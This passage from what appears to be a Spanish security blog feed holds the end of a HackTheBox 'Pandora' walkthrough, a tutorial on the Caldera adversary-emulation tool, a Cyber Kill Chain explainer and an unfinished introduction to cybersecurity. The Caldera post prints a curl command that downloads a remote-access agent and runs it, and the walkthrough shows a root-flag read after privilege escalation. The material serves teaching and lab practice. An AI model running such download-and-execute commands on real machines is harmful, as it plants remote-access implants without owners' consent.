src="/img/Walkthrough/HTB/Pandora/root.png" alt="Figura 11: root.txt"></p><p>Input:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ <span class="hljs-regexp">/usr/</span>bin/pandora_backup<br>$ cat <span class="hljs-regexp">/root/</span>root.txt<br></code></pre></td></tr></table></figure><p>Output:</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">c60f3123e<span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">***</span> ROOT FLAG<br><br></code></pre></td></tr></table></figure><h2 id="Agradecimientos"><a href="#Agradecimientos" class="headerlink" title="Agradecimientos"></a>Agradecimientos</h2><p>Agradecer al siguiente compañero por su ayuda para el pwn de la máquina:</p><p><a href="https://github.com/GatoGamer1155">GatoGamer1155</a></p>]]></content>
    
    
    <categories>
      
      <category>Walkthroughs</category>
      
      <category>HTB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Laboratorio</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Caldera</title>
    <link href="/2021/11/18/Caldera/"/>
    <url>/2021/11/18/Caldera/</url>
    
    <content type="html"><![CDATA[<p>Caldera es un software de <strong>Emulación de Adversarios</strong> muy popular entre la comunidad de hackers trabajando en los equipos de Red Team, Blue Team y Incident Response.</p><h1 id="¿Como-instalar-Caldera"><a href="#¿Como-instalar-Caldera" class="headerlink" title="¿Como instalar Caldera?"></a>¿Como instalar Caldera?</h1><h2 id="Github-instalacion-Offline"><a href="#Github-instalacion-Offline" class="headerlink" title="Github / instalación Offline"></a>Github / instalación Offline</h2><ol><li>Clonamos el repositorio en nuestro equipo<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/mitre/caldera.git --recursive --branch 4.0.0-alpha<br></code></pre></td></tr></table></figure></li><li>Instalamos los requeriments.txt<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip3 install -r requirements.txt<br></code></pre></td></tr></table></figure></li><li>Levantamos el servidor de Caldera. Por defecto utiliza el puerto 8888 del localhost -&gt; <a href="http://localhost:8888/">http://localhost:8888</a><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 server.py --insecure<br></code></pre></td></tr></table></figure></li></ol><h2 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h2><p>Para la instalación, he seguido la web del siguiente enlace:<br><a href="https://caldera.readthedocs.io/en/2.6.6/Docker-deployment.html">https://caldera.readthedocs.io/en/2.6.6/Docker-deployment.html</a></p><ol><li>Clonamos el repositorio en nuestro equipo<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/mitre/caldera.git --recursive --branch 4.0.0-alpha<br></code></pre></td></tr></table></figure></li><li>Como el repositorio de Github contiene un fichero Dockerfile, crearemos nuestra propia imagen de docker a partir de este fichero.<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker build . -t caldera:server<br></code></pre></td></tr></table></figure></li><li>Finalmente creamos el contenedor y levantamos el servidor de Caldera. Por defecto utiliza el puerto 8888 del localhost -&gt; <a href="http://localhost:8888/">http://localhost:8888</a><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run --name caldera -p 7010:7010 -p 7011:7011 -p 7012:7012 -p 8888:8888 caldera:server<br></code></pre></td></tr></table></figure></li><li>Para poder iniciar sesión, necesitamos de las credenciales de los usuarios <strong>red</strong> y <strong>blue</strong>. Se pueden obtener de la siguiente forma:<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker <span class="hljs-built_in">exec</span> -it caldera bash<br>tail -5 /usr/src/app/conf/local.yml<br></code></pre></td></tr></table></figure></li></ol><h1 id="Agentes"><a href="#Agentes" class="headerlink" title="Agentes"></a>Agentes</h1><p>Un agente es un <strong>Troyano de Acceso Remoto (RAT)</strong> que deberemos instalar de forma temporal en los equipos que queramos simular técnicas tanto de ataque como de defensa. Este troyano no lo identifiqueis como algo malicioso para el equipo, es la forma que tiene el software de poder comunicarse con el equipo y poder simular los ataques.<br><img src="/img/Tools/Caldera/agents.png" alt="Figura 1: Menu de agentes"></p><p>En el botón de configuración se podrá definir el tiempo de vida de los agentes en los equipos y el nombre por defecto que van a utilizar. Además permite que estos agentes de base implementen una serie de habilidades, que por defecto no le vamos a añadir ninguna.<br><img src="/img/Tools/Caldera/agents_conf.png" alt="Figura 2: Configuración de agentes"></p><p>En el primer desplegable aparecerán varios tipos de agente en función del tipo de conexión que queramos establecer. Pensando con mentalidad de pentenster, una vez lograsemos explotar un sistema, deberiamos buscar formas de ganar persistencia, como por ejemplo: crear diferentes backdoors o puertas traseras para que en caso de ser detectados y erradicados del sistema, aún tengamos otros mecanismos para seguir permaneciendo y conectándonos a él. El troyano <strong>54ndc47</strong> o <strong>sandcat</strong> es el más utilizado para aprender a utilizar la herramienta.<br><img src="/img/Tools/Caldera/agents_deploy.png" alt="Figura 3: Creación de agentes"></p><p>Finalmente, deberiamos copiar el codigo que aparece en la imagen o a continuación, para que el equipo indicado aparezca en el menú de agentes:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">server=<span class="hljs-string">&quot;http://0.0.0.0:8888&quot;</span>;curl -s -X POST -H <span class="hljs-string">&quot;file:sandcat.go&quot;</span> -H <span class="hljs-string">&quot;platform:darwin&quot;</span> <span class="hljs-variable">$server</span>/file/download &gt; Atrox;chmod +x Atrox;./Atrox -server <span class="hljs-variable">$server</span> -v<br></code></pre></td></tr></table></figure><p><img src="/img/Tools/Caldera/agents_inst.png" alt="Figura 4: Agente instalado"></p><h1 id="Habilidades"><a href="#Habilidades" class="headerlink" title="Habilidades"></a>Habilidades</h1><p>Las habilidades son las diferentes técnicas que han sido reconocidas en el framework de MITRE&amp;TTACk por haberse utilizado durante diferentes tipos de ataques.<br>Los diferentes plugins añaden nuevas técnicas al framework de Caldera. Los módulos que incluyen el mayor número de técnicas son Atomic Red Team y Stockpile.<br><img src="/img/Tools/Caldera/abilities.png" alt="Figura 5: Menu de habilidades"></p><p>El buscador de Caldera nos permite buscar a grandes rasgos habilidades por su nombre o su ID respectivo de MITRE. Esta imagen es un ejemplo de en qué consiste latécnica “T1082 - Hostname Discovery”.<br><img src="/img/Tools/Caldera/abilities_tec.png" alt="Figura 6: Habilidad T1082"></p><p>Otra forma más efectiva de buscar las técnicas que ejecutan un comando en especifico, es haciendo uso de la terminal y un poco de bash scripting.<br>Por ejemplo, si quisiesemos hacer una búsqueda de las técnicas que utilizan el uso del comando “whoami”, deberíamos escribir en la terminal:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">grep -rl <span class="hljs-string">&quot;whoami&quot;</span> /usr/src/app/plugins/stockpile/data/abilities/ | xargs head -n5<br></code></pre></td></tr></table></figure><p>Como resultado, obtendríamos las 3 técnicas que contienen el comando:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">==&gt; /usr/src/app/plugins/stockpile/data/abilities/discovery/c0da588f-79f0-4263-8998-7496b1a40596.yml &lt;==<br>---<br><br>- id: c0da588f-79f0-4263-8998-7496b1a40596<br>  name: Identify active user<br>  description: Find user running agent<br><br>==&gt; /usr/src/app/plugins/stockpile/data/abilities/discovery/bd527b63-9f9e-46e0-9816-b8434d2b8989.yml &lt;==<br>---<br><br>- id: bd527b63-9f9e-46e0-9816-b8434d2b8989<br>  name: Current User<br>  description: Obtain user from current session<br><br>==&gt; /usr/src/app/plugins/stockpile/data/abilities/collection/55678719-e76e-4df9-92aa-10655bbd1cf4.yml &lt;==<br>--- <br>- id: 55678719-e76e-4df9-92aa-10655bbd1cf4<br>  description: User enumeration<br>  name: cmd.exe information gathering<br>  tactic: collection<br></code></pre></td></tr></table></figure><h1 id="Adversarios"><a href="#Adversarios" class="headerlink" title="Adversarios"></a>Adversarios</h1><p>Los adversarios son perfiles de atacantes creados por los desarrolladores que engloban una serie de técnicas acorde a atacantes específicos. Esta herramienta nos permite crear nuestros propios adversarios y testear:</p><ul><li>Técnicas de red team sin tener conocimiento de los comandos que ejecuta realmente un atacante. Esto permite a un usuario de Blue Team comprobar de manera fácil y rápida que tan vulnerable es un sistema ante esos ataques. </li><li>Técnicas de blue team, cuando instalamos el agente de Blue el objetivo es -&gt; como atacante, ver que información puedo obtener de un sistema o aprender nuevos mecanismos para bypasear X protecciones<br>donde se busca bypasear un sistema protegido por los mecanismos establecidos del agente.</li></ul><p>Un ejemplo de adversario es “Noisy Neighbor”, que utiliza técnicas de reconocimiento las cuales mcuhas de ellas son facilmente detectables.<br><img src="/img/Tools/Caldera/adversaries.png" alt="Figura 7: Adversario Noisy Neighbor"></p><h1 id="Operaciones"><a href="#Operaciones" class="headerlink" title="Operaciones"></a>Operaciones</h1><p>Las operaciones son ataques emulados dirigidos a un grupo o varios grupos de equipos donde tengamos instalado los agentes.<br><img src="/img/Tools/Caldera/operations.png" alt="Figura 8: Menú Operaciones"></p><p>Deberemos definir un nombre a dicha operación, seleccionar uno de los atacantes creados por defecto o uno creado por nosotros mismos, los grupos a los que afecta dicha operación (el grupo se define en el apartado de Agentes) y muy importante marcar la opción de Auto-close como en la siguiente imagen.<br><img src="/img/Tools/Caldera/operations_creation.png" alt="Figura 9: Creación de Operaciones"></p><p>Cuando empezemos la operación aparecerá un menú como el de la siguiente imagen. Muestra paso a paso la técnica que se va utilizando, el dispositivo donde se realiza, el comando ejecutado y el restultado de dicho comando.<br><img src="/img/Tools/Caldera/operations_example.png" alt="Figura 10: Operación M4K4RR0N"></p><h1 id="Acceso"><a href="#Acceso" class="headerlink" title="Acceso"></a>Acceso</h1><p>El apartado Access utiliza la conexión establecida con el dispositivo que seleccionemos y ofrece la posibilidad de ejecutar técnicas dirigidas de forma manual e individual aprovechando el canal de C2 del agente instalado.<br><img src="/img/Tools/Caldera/access.png" alt="Figura 11: Menú Acceso"></p><h1 id="Entrenamiento"><a href="#Entrenamiento" class="headerlink" title="Entrenamiento"></a>Entrenamiento</h1><p>Finalmente está el apartado de entrenamiento, donde tendremos diferentes certificados enfocados tanto para uso de la aplicación a nivel de <strong>usuario</strong> como una certificación específica para <strong>Blue</strong>.<br><img src="/img/Tools/Caldera/trainning.png" alt="Figura 12: Menú Entrenamiento"></p>]]></content>
    
    
    <categories>
      
      <category>Herramientas</category>
      
      <category>Emulación de adversarios</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Herramientas</tag>
      
      <tag>IR</tag>
      
      <tag>Red Team</tag>
      
      <tag>Blue Team</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Cyber Kill Chain</title>
    <link href="/2021/11/07/Cyber-Kill-Chain/"/>
    <url>/2021/11/07/Cyber-Kill-Chain/</url>
    
    <content type="html"><![CDATA[<h1 id="Cyber-Kill-Chain"><a href="#Cyber-Kill-Chain" class="headerlink" title="Cyber Kill Chain"></a><strong>Cyber Kill Chain</strong></h1><p>La <strong>Cyber Kill Chain</strong> es un framework creado por Lockheed Martin que explica los procedimientos que puede realizar un atacante en cada una de las fases de un ciberataque. Este modelo además, ayuda a las empresas a poder crear contramedidas y poder defenderse de dichos ataques.</p><h2 id="Metodologia"><a href="#Metodologia" class="headerlink" title="Metodología"></a>Metodología</h2><p>La metodología Cyber Kill Chain ayuda a los profesionales de la seguridad de la información a identificar los pasos de un atacante durante todo el proceso de un ataque. El framework contiene mecanismos de protección contra las amenazas que puedan aparecer durante las 7 fases, mejorando de ese modo activamente la detección y la respuesta a intrusiones.</p><p><img src="/img/Notes/Cyber_Kill_Chain/cyberkillchain.jpg" alt="Figura 1: Cyber Kill Chain"></p><p>Las 7 fases de un ataque consisten en:</p><h3 id="Reconocimiento"><a href="#Reconocimiento" class="headerlink" title="Reconocimiento"></a>Reconocimiento</h3><p>El atacante busca recopilar tanta información sobre el objetivo como sea posible, para buscar puntos débiles antes de atacar. Buscan información como la disponible públicamente en Internet, información de la red y información del sistema. Al realizar un reconocimiento en diferentes niveles de red, el adversario puede obtener información como bloques de red, direcciones IP específicas y detalles de los usuarios. El atacante suele utilizar herramientas de escaneo de hosts activos, puertos abiertos, software automatizado de descubrimiento de vulnerabilidades, etc.</p><p>Las acciones más comunes realizadas por los atacantes en esta fase son:</p><ul><li>Monitorización y análisis del sitio web de la organización objetivo.</li><li>Recopilar información sobre la organización objetivo mediante búsquedas en Internet, redes sociales o mediante ingeniería social.</li><li>Realización de Whois, DNS y footprinting de la red.</li><li>Utilizar herramientas de escaneo para identificar puertos y servicios abiertos.</li></ul><h3 id="Armamento"><a href="#Armamento" class="headerlink" title="Armamento"></a>Armamento</h3><p>El atacante analiza los datos recopilados en la etapa anterior para identificar las vulnerabilidades y técnicas que pueden explotar y obtener acceso no autorizado a la organización objetivo. En función de las vulnerabilidades identificadas durante el análisis, el adversario selecciona o crea una carga útil maliciosa (<strong>payload</strong>) entregable a medida (arma de malware de acceso remoto) utilizando un exploit que contiene un backdoor para enviársela a la víctima. </p><p>Un atacante puede marcar como target dispositivos de red específicos, sistemas operativos (<strong>SO</strong>), endpoints o incluso a personas dentro de la organización para llevar a cabo su ataque. Por ejemplo, el atacante puede enviar un correo electrónico de phishing a un empleado de la organización objetivo, que puede incluir un archivo adjunto malicioso como un virus o gusano que, cuando se descarga, instala un backdoor en el sistema que permite el acceso remoto al atacante.</p><p>Las acciones más comunes realizadas por los atacantes en esta fase son:</p><ul><li>Identificación de la carga útil (<strong>payload</strong>) de malware adecuada según el análisis.</li><li>Crear, reutilizar o modificar algún otro payload de malware disponible en función de la vulnerabilidad identificada.</li></ul><h3 id="Entrega"><a href="#Entrega" class="headerlink" title="Entrega"></a>Entrega</h3><p>El exploit creado previamente se transmite a las víctimas como un archivo adjunto de correo electrónico, a través de un enlace malicioso en sitios web o mediante una aplicación web vulnerable o una unidad USB. La entrega <strong>es una etapa clave</strong>, que mide la efectividad de las estrategias de defensa implementadas por la organización objetivo en función de si el intento de intrusión del atacante ha sido detectado y bloqueado o no.</p><p>Las acciones más comunes realizadas por los atacantes en esta fase son:</p><ul><li>Envío de correos electrónicos de <strong>phishing</strong> a los empleados de la organización objetivo.</li><li>Distribuir unidades USB que contienen cargas útiles maliciosas a los empleados de la organización objetivo.</li><li>Aprovechar vulnerabilidades existentes sobre los sistemas operativos, aplicaciones y servidores de la organización objetivo.</li></ul><h3 id="Explotacion"><a href="#Explotacion" class="headerlink" title="Explotación"></a>Explotación</h3><p>Una vez que el exploit se transmite a la víctima, la explotación activa el código malicioso del atacante para aprovechar una vulnerabilidad en el sistema operativo, la aplicación o el servidor en un sistema objetivo. Esta fase no solo consiste en la ejecución de exploits, sino que un atacante también puede explotar alguna vulnerabilidad debido a una mala configuración de seguridad por parte del personal responsable de mantener esos sistemas (LFI, RFI, SQL Injection, etc.).</p><p>Las acciones más comunes realizadas por los atacantes en esta fase son:</p><ul><li>Explotar las vulnerabilidades de software o hardware para obtener acceso remoto al sistema de destino</li></ul><h3 id="Instalacion"><a href="#Instalacion" class="headerlink" title="Instalación"></a>Instalación</h3><p>El atacante una vez consigue acceso remoto al equipo objetivo, descarga e instala más software malicioso en el sistema para mantener el acceso a la red objetivo durante un período prolongado. Pueden usar el arma para instalar una puerta trasera para obtener acceso remoto. Además, el atacante obtiene la capacidad de propagar malware a otros sistemas de la red. Un atacante siempre intenta ocultar la presencia de sus actividades maliciosas de los controles de seguridad, como los firewalls, utilizando diversas técnicas, como el cifrado.</p><p>Las acciones más comunes realizadas por los atacantes en esta fase son:</p><ul><li>Mantener el acceso al sistema objetivo.</li><li>Descargar e instalar software malicioso, como backdoors.</li><li>Obtener acceso remoto al sistema.</li></ul><h3 id="Comando-y-control"><a href="#Comando-y-control" class="headerlink" title="Comando y control"></a>Comando y control</h3><p>El atacante crea un canal de comando y control, que establece una comunicación bidireccional entre el sistema de la víctima y el servidor controlado por el atacante para comunicarse y enviar datos de un lado a otro. Los atacantes suelen implementar técnicas como el cifrado para ocultar la presencia de dichos canales. Usando este canal, el atacante toma el control remoto del sistema o red objetivo.</p><p>Las acciones más comunes realizadas por los atacantes en esta fase son:</p><ul><li>Establecer un canal de comunicación bidireccional entre el sistema de la víctima y el servidor controlado por el atacante.</li><li>Aprovecharse de protocoles comunes como HTTP, ICM, DNS, etc. para tunelizar el tráfico y pasar más desapercibido. </li><li>Aplicar técnicas de escalada de privilegios</li><li>Ocultar las pistas mediante técnicas de cifrado.</li></ul><h3 id="Acciones-y-objetivos"><a href="#Acciones-y-objetivos" class="headerlink" title="Acciones y objetivos"></a>Acciones y objetivos</h3><p>El atacante controla el sistema objetivo desde una ubicación remota y finalmente logra sus objetivos. El atacante obtiene acceso a información sensible, y obtiene la capacidad de interrumpir o destruir los servicios del sistema, aparte de poder comprometer más sistemas de la red. Además, el atacante puede utilizar este sistema explotado como punto de partida para realizar otros ataques.</p><h2 id="Tacticas-Tecnicas-y-Procedimientos-TTPs"><a href="#Tacticas-Tecnicas-y-Procedimientos-TTPs" class="headerlink" title="Tácticas, Técnicas y Procedimientos (TTPs)"></a>Tácticas, Técnicas y Procedimientos (TTPs)</h2><p>Las tácticas, técnicas y procedimientos son patrones de actividades y métodos que ayudan a identificar grupos criminales o Advanced Persistent Threads (<strong>APTs</strong>) relacionados. Para poder implementar una buena defensa en un sistema, es muy importante entender estas TTPs para poder, de esa forma conocer como suelen actuar los distintos APTs. Entender las TTPs ayuda a predecir y detectar actividades anómalas antes de que puedan volverse una amenaza mayor, aparte de identificar vulnerabilidades en los sistemas y poder implementar o mejorar los mecanismos de defensa.</p><h3 id="Tacticas"><a href="#Tacticas" class="headerlink" title="Tácticas"></a>Tácticas</h3><p>Las tácticas describe la forma de actuar de actores de amenaza durante las diferentes fases de un ataque. Todo ataque consiste en un conjunto de tácticas para recolectar información, realizar una escalada de privilegios y ganar persistencia en el sistema. Los APTs suelen tener un conjunto de tácticas predefinidas pero, en algunas circunstancias pueden llegar a alterar su forma de atacar. Por ello, las empresas pueden identificar a los diferentes APTs en función de las tácticas que utilicen en ese moomento.</p><p>Una forma para detectar a los diferentes grupos de  APTs, se basa en conocer el conjunto de herramientas que utilizan para elaborar el ataque. Por ejemplo, en el caso de detectar un canal de Comando y control (<strong>C&amp;C</strong>), se puede descubrir la geolocalización aproximada de a que lugar del mundo pertenece el servidor de C&amp;C. Si se sabe que hay solo 3 APTs que actúan desde ese país, se puede aproximar mucho más la investigación de esos grupos y ver que otras tácticas suelen utilizar.</p><h3 id="Tecnicas"><a href="#Tecnicas" class="headerlink" title="Técnicas"></a>Técnicas</h3><p>Las técnicas son las diferentes acciones que se realizan en cada una de las tácticas de las diferentes fases de un ataque. Un ejemplo podrías ser:</p><ul><li>Para la táctica de reconocer puertos abiertos en un sistema específico, las técnicas serían la utilización de la herramienta Nmap con las flags adecuadas o estudiar el tipo de respuesta en base a una trama ICMP (<strong>ping</strong>).</li></ul><p>Las técnicas pueden ser analizadas en cada una de las fases del ciclo de vida de un ataque. Las técnicas no tienen porque solo ser aspectos técnicos, la ingeniería social es una técnica que no requiere de ningún tipo de software y en cambio es muy efectiva. Cabe destacar que las técnicas de ingeniería social se suele utilizar en la fase inicial de un ataque, ya que a partir de ahí se pueden obtener nombres de empleados, correos electrónicos, números de teléfono y otro tipo de información muy útil a la hora de explotar controles de accesos.</p><p>Las técnicas utilizadas en las fases un poco más desarrolladas cada vez dependen más de aspectos técnicos o conjunto de herramientas de software a utilizar, como son conocimiento de técnicas para elaborar escalada de privilegios en los sistemas o realizar movimientos laterales para evitar ser detectado.</p><p>Las técnicas en la última fase del ataque puede mezclar aspectos técnicos y no técnicos. Un ejemplo podría ser:</p><ul><li>El atacante una vez ha obtenido acceso privilegiado al sistema, encripta los ficheros que pretende robar, los envía por el canal de C&amp;C y los almacena en su sistema. Una vez ya tiene la información en su poder, utiliza herramientas puramente técnicas para limpiar todos los logs que haya podido generar y así no poder ser rastreado.</li></ul><h3 id="Procedimientos"><a href="#Procedimientos" class="headerlink" title="Procedimientos"></a>Procedimientos</h3><p>Los procedimientos son la secuencia de acciones realizadas por los APTs en las diferentes fases del ciclo de vida de un ataque. El número de acciones a realizar en una misma fase puede variar entre un ataque y otro, con el fin de obtener el mismo objetivo intermedio. Esto es debido a que aumenta las probabilidades de lograr el objetivo y reduce las probabilidades de ser detectado por los mecanismos de seguridad.</p><p>Comprender y analizar los procedimientos implementados en el ataque, puede ayudar a identificar los actores de amenaza. Intentar perfilar un APT en la fase inicial de un ataque puede ser complicado. Sin embargo, conforme los atacantes avanzan en las fases de un ataque, es más fácil comprender quienes son los actores de amenaza y cual es su objetivo final.</p>]]></content>
    
    
    <categories>
      
      <category>Apuntes</category>
      
      <category>Introducción al Ethical Hacking</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Teoría</tag>
      
      <tag>Fundamental</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Introducción a la ciberseguridad</title>
    <link href="/2021/11/05/Introduction_to_ETH/"/>
    <url>/2021/11/05/Introduction_to_ETH/</url>
    
    <content type="html"><![CDATA[<h1 id="Introduccion-a-la-ciberseguridad"><a href="#Introduccion-a-la-ciberseguridad" class="headerlink" title="Introducción a la ciberseguridad"></a>Introducción a la ciberseguridad</h1><p>La seguridad de la información se refiere a la protección de la información y los sistemas que almacenan y transmiten estos activos contra el acceso no permitido, la exposición, la alteración y la destrucción de la información. Hay que evitar a toda costa que la información que se quiera proteger caiga en malas manos, ya que puede exponer datos sensibles tanto a nivel personal (números de teléfono, DNI, dirección del domicilio, etc.) como a nivel empresarial (información tanto de la propia empresa como de los clientes).</p><h2 id="Los-5-pilares-de-la-ciberseguridad"><a href="#Los-5-pilares-de-la-ciberseguridad" class="headerlink" title="Los 5 pilares de la ciberseguridad"></a>Los 5 pilares de la ciberseguridad</h2><p><img src="/img/Notes/Intro_to_ETH/pilares.png" alt="Figura 1: Los 5 principios de la ciberseguridad"></p><p>El bienestar de la información consiste en mantener el estado de los activos y de los servicios con un riesgo bajo o tolerable. Para ello hay que tener presente los 5 pilares de la ciberseguridad:</p><h3 id="Confidencialidad"><a href="#Confidencialidad" class="headerlink" title="Confidencialidad"></a>Confidencialidad</h3><p>La confidencialidad es la garantía de que la información es accesible solo para los autorizados. Las violaciones de la confidencialidad pueden ocurrir debido a un manejo inadecuado de los datos o un intento de piratería. Los controles de confidencialidad incluyen clasificación de datos, cifrar la información y eliminación adecuada de equipos (como DVDs, unidades USBs, etc.).</p><h3 id="Integridad"><a href="#Integridad" class="headerlink" title="Integridad"></a>Integridad</h3><p>La integridad es la fiabilidad de la información ante la prevención de cambios inapropiados y no autorizados, es la garantía de que la información es lo suficientemente precisa para su propósito. Las medidas para mantener la integridad de los datos pueden incluir una <strong>suma de comprobación</strong> (un número producido por una función matemática para verificar que un bloque de datos determinado no cambia o “<strong>CHECKSUM</strong>“) y un control de acceso (que garantiza que solo las personas autorizadas puedan actualizar, agregar o eliminar datos).</p><h3 id="Disponibilidad"><a href="#Disponibilidad" class="headerlink" title="Disponibilidad"></a>Disponibilidad</h3><p>La disponibilidad es la garantía de que los sistemas responsables de entregar, almacenar y procesar la información son accesibles cuando los usuarios autorizados lo requieran. Las medidas para mantener la disponibilidad de los datos pueden incluir matrices de discos para sistemas redundantes (Sistemas <strong>RAID</strong>) y máquinas agrupadas (o <strong>Cluster</strong>), software antivirus para combatir el malware y sistemas distribuidos de prevención de denegación de servicio (DDoS).</p><h3 id="Autenticidad"><a href="#Autenticidad" class="headerlink" title="Autenticidad"></a>Autenticidad</h3><p>La autenticidad se refiere a la característica de la comunicación, los documentos o cualquier dato que asegure la calidad de ser genuinos o no corruptos. El papel principal de la autenticación es confirmar que un usuario es genuino. Los controles como la biometría, las tarjetas inteligentes y los certificados digitales garantizan la autenticidad de los datos, las transacciones, las comunicaciones y los documentos.</p><h3 id="No-repudio"><a href="#No-repudio" class="headerlink" title="No repudio"></a>No repudio</h3><p>El no repudio es una forma de garantizar que el remitente de un mensaje no pueda negar posteriormente haber enviado el mensaje y que el destinatario no pueda negar haber recibido el mensaje. Las personas y las organizaciones utilizan firmas o certificados digitales para garantizar el no repudio.</p><h2 id="Motivos-metas-y-objetivos-de-los-ataques"><a href="#Motivos-metas-y-objetivos-de-los-ataques" class="headerlink" title="Motivos, metas y objetivos de los ataques"></a><strong>Motivos, metas y objetivos de los ataques</strong></h2><p>Los atacantes generalmente tienen motivos (metas) y objetivos detrás de sus ataques a la seguridad de la información. Un motivo se origina en la noción de que un sistema de destino almacena o procesa algo valioso o simplemente como acto de venganza, lo que conduce a la amenaza de un ataque al sistema. </p><p>Por tanto, estos motivos u objetivos dependen del estado de ánimo del atacante, de su razón para realizar dicha actividad, así como de sus recursos y capacidades. Una vez que el atacante determina su objetivo, puede emplear varias herramientas, técnicas de ataque y métodos para explotar las vulnerabilidades en los sistemas, políticas y controles de seguridad.</p><div style="text-align:center; font-weight: bold">Ataques = Motivo (objetivo) + Método + Vulnerabilidad</div><br><p>Los motivos más comunes detrás de un ataque pueden ser:</p><ul><li>Exigir un rescate</li><li>Provocar pérdidas económicas al objetivo</li><li>Interrumpir la continuidad del negocio</li><li>Realizar un robo de información</li><li>Dañar la reputación del objetivo</li><li>Manipular datos</li><li>Venganza</li></ul><h2 id="Categorias-de-ataques"><a href="#Categorias-de-ataques" class="headerlink" title="Categorías de ataques"></a>Categorías de ataques</h2><h3 id="Ataques-Pasivos"><a href="#Ataques-Pasivos" class="headerlink" title="Ataques Pasivos"></a>Ataques Pasivos</h3><p>Los ataques pasivos implican interceptar y monitorear el tráfico de la red y el flujo de datos en la red objetivo y no alterar los datos. Los atacantes realizan un reconocimiento de las actividades de la red mediante rastreadores (<strong>sniffers</strong>). Estos ataques son muy difíciles de detectar ya que el atacante no tiene una interacción activa con el sistema o la red objetivo. Los ataques pasivos permiten a los atacantes capturar los datos o archivos que se transmiten en la red sin el consentimiento del usuario. Por ejemplo, un atacante puede obtener información como datos en tránsito sin cifrar, credenciales en texto plano (sin cifrar) u otra información confidencial que sea útil para realizar ataques activos.</p><p>Ejemplos más comúnes de ataques pasivos:</p><ul><li>Análisis del tráfico de red</li><li>Olfatear o escuchar a escondidas (<strong>Sniffing</strong> and <strong>eavesdropping</strong>)</li><li>Descifrar tráfico con algoritmos de encriptación débil</li><li>Footprinting</li></ul><div style="page-break-after: always; break-after: page;"></div><h3 id="Ataques-Activos"><a href="#Ataques-Activos" class="headerlink" title="Ataques Activos"></a>Ataques Activos</h3><p>Los ataques activos manipulan los datos en tránsito o interrumpen la comunicación o los servicios entre los sistemas para tratar de saltarse los sistemas de seguridad y poder irrumpir en los sistemas. Los atacantes lanzan ataques en los sistemas o en la red objetivo provocando de esta forma tráfico detectable. Estos ataques penetran e infectan la red interna del objetivo y obtienen acceso a un sistema remoto para comprometer la red interna.</p><p>Ejemplo más comúnes de ataques activos:</p><ul><li><p>Escalada de privilegios (<strong>Privilege Escalation</strong>)</p></li><li><p>Ataques de malware (como virus, gusanos, ransomware, troyanos, logic boombs, etc.)</p></li><li><p>Acceso por puerta trasera (<strong>Backdoor</strong>)</p></li><li><p>Ataques basados en contraseñas (<strong>Bruteforce</strong>)</p></li><li><p>Inyección SQL (<strong>SQL Injection</strong>)</p></li><li><p>Ataques XSS (<strong>XSS - Cross Site Scripting Attacks</strong>)</p></li><li><p>Ataque de denegación de servicio (DoS)</p></li><li><p>Ataques de suplantación (<strong>Spoofing Attacks</strong>)</p></li><li><p>Ataques de repetición (<strong>Replay Attacks</strong>)</p></li><li><p>Secuestro de sesión (<strong>Session Hijacking</strong>)</p></li><li><p>Ataque man-in-the-middle (<strong>MiTM</strong>)</p></li><li><p>Envenenamiento por DNS y ARP (<strong>DNS and ARP Poisonning</strong>)</p></li><li><p>Perfilado (<strong>Profilling</strong>)</p></li><li><p>Ejecución de código arbitrario</p></li><li><p>Explotación de software de aplicaciones y sistemas operativos</p></li><li><p>Ataques transversales de directorio (<strong>LFI and RFI Attacks</strong>)</p></li></ul><h3 id="Ataques-Perimetrales-o-Externos"><a href="#Ataques-Perimetrales-o-Externos" class="headerlink" title="Ataques Perimetrales o Externos"></a>Ataques Perimetrales o Externos</h3><p>Los ataques perimetrales o externos se realizan cuando el atacante se encuentra físicamente cerca del perímetro del objetivo con el fin de irrumpir en los sistemas o la red objetivo. El objetivo principal de realizar este tipo de ataque es recopilar o interrumpir su acceso. Los atacantes pueden ganar acceso a puertas abiertas o obtener algún tipo de información sensible gracias a estar escondidos/ocultos.</p><p>Ejemplos 